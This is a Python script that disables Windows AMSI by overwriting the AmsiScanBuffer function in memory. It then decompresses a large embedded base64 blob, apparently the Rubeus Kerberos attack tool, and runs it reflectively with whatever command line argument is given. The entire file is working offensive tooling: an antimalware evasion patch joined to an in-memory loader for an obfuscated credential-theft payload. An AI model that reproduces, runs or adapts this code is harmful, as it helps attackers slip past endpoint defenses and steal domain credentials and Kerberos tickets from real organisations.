import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    rubeus_program_type = assembly.GetType("Rubeus.Program")

    # You don't need to create an instance of the class for a static method
    method = rubeus_program_type.GetMethod("MainString")

    # Convert your command to a .NET string array
    command_args = to_clr_array([command])

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()